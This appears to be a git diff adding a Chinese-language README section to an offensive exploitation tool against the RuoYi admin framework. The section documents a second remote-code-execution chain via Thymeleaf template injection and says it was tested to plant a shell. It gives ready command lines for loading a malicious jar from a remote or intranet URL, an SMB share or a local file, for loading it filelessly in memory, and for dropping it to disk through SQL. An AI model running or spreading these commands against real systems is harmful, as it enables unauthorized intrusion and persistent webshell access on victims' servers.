@@ -38,6 +38,24 @@ java -jar ruoyi-gzms.jar --url http://target:8080 --cookie "JSESSIONID=..."
 #   --no-cleanup    保留临时任务和被改写的 job1
 ```
 
+## SSTI 链模式（第二条独立 RCE，实测进马）
+
+`--mode ssti` 走 Thymeleaf SSTI（CacheController `fragment` 注入），与定时任务链完全独立、互为备份。投递三选一：
+
+```bash
+# 1) 远程/本地/UNC jar 加载
+java -jar ruoyi-gzms.jar --url http://target:8080 --user U --pass P --mode ssti --jar-url http://内网IP/g.jar
+java -jar ruoyi-gzms.jar ... --mode ssti --jar-url "file:/path/g.jar"        # 本地文件（已落盘）
+java -jar ruoyi-gzms.jar ... --mode ssti --jar-url "\\\\host\\share\\g.jar"  # Windows UNC/内网SMB
+# 2) 纯内存（零文件零网络，类字节 base64 内嵌 + 反射 defineClass）
+java -jar ruoyi-gzms.jar ... --mode ssti --inline --jar-url http://镜像/g.jar   # 从jar提取类，无需目标落盘
+# 3) SQL 落盘再本地加载（站库同机）
+java -jar ruoyi-gzms.jar ... --mode ssti --jar-url http://镜像/g.jar --drop-to /var/lib/mysql-files/g.jar
+#   --load-path PATH  落盘后实际加载路径（默认=drop-to；docker/站库分离实验用）
+```
+
+要求目标账号有 `monitor:cache:view` 权限（admin 默认有）。机制、字符禁区、坑位见技能库 `references/ssti-chain.md`。
+
 要求 JRE 8+，无其他依赖。Windows 同样：`java -jar ruoyi-gzms.jar --url ... --user ... --pass ...`。
 
 ## Windows curl 快速验证
